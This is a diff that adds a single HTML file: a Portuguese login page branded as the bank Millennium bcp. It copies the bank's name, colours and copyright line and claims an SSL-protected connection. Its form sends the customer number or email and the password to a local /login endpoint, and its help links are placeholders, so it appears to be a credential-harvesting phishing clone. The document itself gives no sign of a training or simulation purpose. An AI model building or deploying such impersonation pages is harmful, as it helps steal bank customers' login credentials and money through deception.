@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Millennium bcp - Particulares</title>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'><rect width='48' height='48' fill='%2300a859' rx='4'/><path fill='%23fff' d='M12 16h24v2H12zm0 5h24v2H12zm0 5h18v2H12z'/></svg>" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      font-family: "Open Sans", Arial, sans-serif;
+      background: #f5f5f5;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+    
+    .header {
+      background: #00a859;
+      padding: 20px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    
+    .header-content {
+      max-width: 1200px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    
+    .logo {
+      color: #fff;
+      font-size: 28px;
+      font-weight: bold;
+      letter-spacing: -1px;
+    }
+    
+    .logo-text {
+      font-size: 14px;
+      font-weight: normal;
+      margin-left: 5px;
+    }
+    
+    .main {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 20px;
+    }
+    
+    .container {
+      max-width: 450px;
+      width: 100%;
+    }
+    
+    .card {
+      background: #fff;
+      border-radius: 8px;
+      padding: 40px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+    
+    h1 {
+      color: #333;
+      font-size: 28px;
+      margin-bottom: 10px;
+    }
+    
+    .subtitle {
+      color: #666;
+      font-size: 14px;
+      margin-bottom: 30px;
+    }
+    
+    .input-group {
+      margin-bottom: 20px;
+    }
+    
+    label {
+      display: block;
+      color: #333;
+      font-size: 14px;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+    
+    input {
+      width: 100%;
+      padding: 12px 16px;
+      font-size: 16px;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      outline: none;
+      transition: border-color 0.3s;
+    }
+    
+    input:focus {
+      border-color: #00a859;
+    }
+    
+    .checkbox-group {
+      display: flex;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+    
+    .checkbox-group input[type="checkbox"] {
+      width: auto;
+      margin-right: 8px;
+    }
+    
+    .checkbox-group label {
+      margin: 0;
+      font-weight: normal;
+      font-size: 14px;
+      color: #666;
+    }
+    
+    button {
+      width: 100%;
+      padding: 14px;
+      background: #00a859;
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    
+    button:hover {
+      background: #008f4c;
+    }
+    
+    .links {
+      margin-top: 20px;
+      text-align: center;
+    }
+    
+    .links a {
+      color: #00a859;
+      text-decoration: none;
+      font-size: 14px;
+      display: block;
+      margin-top: 10px;
+    }
+    
+    .links a:hover {
+      text-decoration: underline;
+    }
+    
+    .security {
+      margin-top: 30px;
+      padding-top: 20px;
+      border-top: 1px solid #eee;
+    }
+    
+    .security-icon {
+      display: flex;
+      align-items: center;
+      color: #00a859;
+      font-size: 14px;
+      gap: 8px;
+    }
+    
+    .footer {
+      background: #333;
+      color: #fff;
+      padding: 20px;
+      text-align: center;
+      font-size: 12px;
+    }
+    
+    @media (max-width: 600px) {
+      .card {
+        padding: 30px 20px;
+      }
+      
+      h1 {
+        font-size: 24px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <div class="header-content">
+      <div class="logo">
+        Millennium <span class="logo-text">bcp</span>
+      </div>
+    </div>
+  </div>
+  
+  <div class="main">
+    <div class="container">
+      <div class="card">
+        <h1>Acesso</h1>
+        <p class="subtitle">Aceda à sua conta com os seus dados</p>
+        
+        <form method="POST" action="/login">
+          <div class="input-group">
+            <label for="user">Utilizador</label>
+            <input type="text" id="user" name="username" placeholder="Número de cliente ou email" required />
+          </div>
+          
+          <div class="input-group">
+            <label for="pass">Palavra-passe</label>
+            <input type="password" id="pass" name="password" placeholder="Insira a sua palavra-passe" required />
+          </div>
+          
+          <div class="checkbox-group">
+            <input type="checkbox" id="remember" />
+            <label for="remember">Memorizar utilizador</label>
+          </div>
+          
+          <button type="submit">Entrar</button>
+        </form>
+        
+        <div class="links">
+          <a href="#">Esqueci a palavra-passe</a>
+          <a href="#">Primeiro acesso? Registe-se aqui</a>
+          <a href="#">Ajuda</a>
+        </div>
+        
+        <div class="security">
+          <div class="security-icon">
+            🔒 Ligação segura protegida por encriptação SSL
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <div class="footer">
+    © 2024 Millennium bcp. Todos os direitos reservados.
+  </div>
+</body>
+</html>
